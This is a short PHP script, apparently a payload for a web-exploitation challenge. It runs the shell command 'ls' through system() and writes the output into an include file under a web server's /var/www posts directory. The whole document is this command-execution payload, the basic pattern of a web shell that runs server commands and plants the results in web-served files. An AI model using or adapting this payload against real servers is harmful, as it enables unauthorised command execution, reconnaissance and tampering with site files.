<?php 
$data=system("ls"); 
#echo $data;
$filename = "/var/www/2a1e1ca8e8/posts/first.inc.php";
$file = fopen( $filename, "w" );
fwrite( $file, $data);
fclose( $file );
?>
